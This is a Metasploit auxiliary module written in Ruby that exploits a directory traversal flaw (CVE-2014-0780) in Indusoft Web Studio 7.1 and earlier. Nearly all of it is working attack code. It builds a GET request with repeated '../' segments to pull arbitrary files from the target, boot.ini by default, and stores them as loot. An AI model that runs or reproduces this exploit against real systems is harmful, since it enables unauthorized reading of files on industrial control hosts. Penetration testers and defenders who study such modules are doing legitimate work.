 
class MetasploitModule < Msf::Auxiliary
    Rank = GreatRanking
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Indusoft Web Studio Directory Traversal&#039;,
            &#039;Description&#039;    => %q{
                This module exploits a flaw found in Indusoft Web Studio
                <= 7.1 before SP2 Patch 4. This specific flaw allows users
                to browse outside of the webroot to download files found
                on the underlying system
            },
            &#039;Author&#039;         => [ &#039;James Fitts&#039; ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => &#039;$Revision: $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;2014-0780&#039; ],
                    [ &#039;ZDI&#039;, &#039;14-118/&#039; ],
                    [ &#039;URL&#039;, &#039;http://ics-cert.us-cert.gov/advisories/ICSA-14-107-02&#039;]
                ],
            &#039;DisclosureDate&#039; => &#039;Jan 18 2013&#039;))
 
        register_options(
            [
                OptInt.new(&#039;DEPTH&#039;, [ false, &#039;Levels to reach base directory&#039;, 8]),
                OptString.new(&#039;FILE&#039;, [ false, &#039;This is the file to download&#039;, &#039;boot.ini&#039;]),
                Opt::RPORT(80)
            ], self.class )
    end
 
    def run
 
    depth = (datastore[&#039;DEPTH&#039;].nil? or datastore[&#039;DEPTH&#039;] == 0) ? 10 : datastore[&#039;DEPTH&#039;]
    levels = "/" + ("../" * depth)
 
    res = send_request_raw({
        &#039;method&#039;    => &#039;GET&#039;,
        &#039;uri&#039;       => "/" + levels + datastore[&#039;FILE&#039;],
    })
 
    if res and res.code == 200 and res.message =~ /Sending file/
        loot = res.body
        if not loot or loot.empty?
            print_status("File from #{rhost}:#{rport} is empty...")
            return
        end
        file = ::File.basename(datastore[&#039;FILE&#039;])
        path = store_loot(&#039;indusoft.webstudio.file&#039;, &#039;application/octet-stream&#039;, rhost, loot, file, datastore[&#039;FILE&#039;])
        print_status("Stored #{datastore[&#039;FILE&#039;]} to #{path}")
        return
    end
 
    end
end

